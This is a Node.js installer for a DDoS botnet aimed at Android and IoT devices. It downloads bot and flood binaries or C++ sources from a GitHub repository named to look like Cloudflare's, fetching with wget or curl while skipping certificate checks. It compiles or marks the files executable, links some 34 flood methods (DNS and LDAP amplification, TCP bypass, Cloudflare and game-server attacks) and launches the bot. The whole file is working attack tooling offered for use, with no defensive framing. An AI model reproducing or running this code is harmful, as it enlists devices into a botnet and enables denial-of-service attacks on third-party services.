/**
 * Bot Setup Script for Android & IoT Environments
 * Pure Node.js & Multi-Platform Compatible
 * Downloads binaries/sources, creates method links for flood.cpp, and launches bot.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
    { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
    { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
    { url: `${REPO_BASE}/bots/https`, filename: 'https', executable: true },
    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
];

const SOURCE_FILES = [
    { url: `${REPO_BASE}/bots/bot.cpp`, filename: 'bot.cpp' },
    { url: `${REPO_BASE}/bots/flood.cpp`, filename: 'flood.cpp' },
    { url: `${REPO_BASE}/bots/http.cpp`, filename: 'http.cpp' },
    { url: `${REPO_BASE}/bots/https.cpp`, filename: 'https.cpp' }
];

const METHODS = [
    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
    'subnet', 'icmp',
    'http', 'https', 'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
];

function downloadHttp(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return downloadHttp(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

function downloadWgetOrCurl(url, destPath) {
    try {
        execSync(`wget -q --no-check-certificate -O "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    try {
        execSync(`curl -s -k -L -o "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    return false;
}

async function downloadFile(url, destPath) {
    try {
        await downloadHttp(url, destPath);
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return;
    } catch (_) {}

    const ok = downloadWgetOrCurl(url, destPath);
    if (!ok) {
        throw new Error(`Failed to download from ${url}`);
    }
}

function tryNativeCompilation(targetDir) {
    let compiler = null;
    try {
        execSync('which clang++ || which g++ || which c++', { stdio: 'ignore' });
        compiler = execSync('which clang++ || which g++ || which c++').toString().trim().split('\n')[0];
    } catch (_) {
        return false;
    }

    if (!compiler) return false;
    console.log(`[*] Compiler found (${compiler}). Compiling native IoT binaries...`);

    let hasSsl = false;
    try {
        execSync(`echo '#include <openssl/ssl.h>' | ${compiler} -E -`, { stdio: 'ignore' });
        hasSsl = true;
    } catch (_) {
        hasSsl = false;
    }

    const sslFlag = hasSsl ? '-lssl -lcrypto' : '-DNO_SSL';
    try {
        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -o bot bot.cpp`, { cwd: targetDir, stdio: 'ignore' });
        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o flood flood.cpp ${sslFlag}`, { cwd: targetDir, stdio: 'ignore' });
        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o http http.cpp`, { cwd: targetDir, stdio: 'ignore' });
        if (hasSsl) {
            execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o https https.cpp -lssl -lcrypto`, { cwd: targetDir, stdio: 'ignore' });
        }
        return true;
    } catch (err) {
        console.warn(`[!] Native compilation warning: ${err.message}`);
        return false;
    }
}

function createMethodLinks(targetDir) {
    const floodPath = path.join(targetDir, 'flood');
    if (!fs.existsSync(floodPath)) return;

    console.log('[*] Setting up method symlinks for flood.cpp...');
    for (const m of METHODS) {
        const linkPath = path.join(targetDir, m);
        try {
            if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
            fs.symlinkSync('flood', linkPath);
        } catch (_) {
            try {
                fs.copyFileSync(floodPath, linkPath);
                fs.chmodSync(linkPath, 0o755);
            } catch (err) {
                console.error(`[!] Failed to link method ${m}: ${err.message}`);
            }
        }
    }
    console.log('[+] All method links ready.');
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up IoT/Android Bot in: ${targetDir}`);

    // Download agent config
    try {
        await downloadFile(`${REPO_BASE}/agent.txt?t=${Date.now()}`, path.join(targetDir, 'agent.txt'));
    } catch (_) {}

    // Try downloading sources
    for (const src of SOURCE_FILES) {
        try {
            await downloadFile(`${src.url}?t=${Date.now()}`, path.join(targetDir, src.filename));
        } catch (_) {}
    }

    const compiled = tryNativeCompilation(targetDir);
    if (!compiled) {
        console.log('[*] Downloading precompiled binaries...');
        for (const item of FILES_TO_DOWNLOAD) {
            const dest = path.join(targetDir, item.filename);
            try {
                process.stdout.write(`[*] Downloading ${item.filename}... `);
                await downloadFile(`${item.url}?t=${Date.now()}`, dest);
                console.log('OK');
                if (item.executable) {
                    fs.chmodSync(dest, 0o755);
                }
            } catch (err) {
                console.log('FAILED');
            }
        }
    }

    createMethodLinks(targetDir);

    const botBinPath = path.join(targetDir, 'bot');
    if (fs.existsSync(botBinPath)) {
        fs.chmodSync(botBinPath, 0o755);
        console.log('[+] Launching Bot process...');
        const child = spawn(botBinPath, [], {
            cwd: targetDir,
            stdio: ['inherit', 'pipe', 'pipe']
        });

        child.stdout.on('data', (data) => process.stdout.write(data));
        child.stderr.on('data', (data) => process.stderr.write(data));

        child.on('error', (err) => {
            console.error(`[!] Failed to start bot: ${err.message}`);
            process.exit(1);
        });

        child.on('exit', (code, signal) => {
            console.log(`[!] Bot process exited (${code} / ${signal})`);
            process.exit(code || 0);
        });

        process.on('SIGINT', () => child.kill('SIGINT'));
        process.on('SIGTERM', () => child.kill('SIGTERM'));
    } else {
        console.error('[-] Bot binary not found.');
        process.exit(1);
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
